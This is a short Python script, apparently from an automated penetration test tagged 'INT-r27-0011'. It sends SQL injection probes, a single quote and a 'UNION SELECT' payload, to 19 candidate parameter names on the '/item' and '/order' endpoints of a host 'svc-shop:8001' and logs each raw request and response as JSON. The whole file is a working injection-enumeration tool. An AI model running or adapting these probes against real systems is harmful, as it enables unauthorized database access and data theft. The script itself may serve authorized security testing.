#!/usr/bin/env python3
# INT-r27-0011 补充轮: /item /order 扩展参数名族 × 注入探针（完备性补枚举）
import http.client, json, time, urllib.parse

HOST, PORT = "svc-shop", 8001
EXTRA_PARAMS = ["product_id", "prod_id", "sku", "orderNo", "order_no", "no", "num",
                "page", "cat", "category", "kw", "v", "w", "term", "search", "type", "ref", "code", "sn"]
PAYLOADS = [("p2-quote", "1'"), ("p5-union", "1 UNION SELECT 1--")]
PATHS = ["/item", "/order"]

def send(path_query):
    c = http.client.HTTPConnection(HOST, PORT, timeout=8)
    c.request("GET", path_query, headers={"Host": "svc-shop:8001", "Connection": "close"})
    r = c.getresponse()
    body = r.read().decode("utf-8", "replace")
    hdrs = dict(r.getheaders())
    c.close()
    return r.status, hdrs, body

results = []
for p in PATHS:
    for prm in EXTRA_PARAMS:
        for tag, pl in PAYLOADS:
            q = prm + "=" + urllib.parse.quote(pl, safe="")
            tgt = p + "?" + q
            time.sleep(0.25)
            try:
                s, h, b = send(tgt)
                results.append({"path": p, "query": q, "param": prm, "payload_tag": tag, "payload": pl,
                                "raw_request": "GET %s HTTP/1.1\r\nHost: svc-shop:8001\r\n\r\n" % tgt,
                                "status": s, "headers": h, "body": b})
            except Exception as e:
                results.append({"path": p, "query": q, "param": prm, "payload_tag": tag, "payload": pl, "error": repr(e)})

print(json.dumps({"intent": "INT-r27-0011", "round": 2, "target": "http://svc-shop:8001",
                  "count": len(results), "results": results}, ensure_ascii=False))
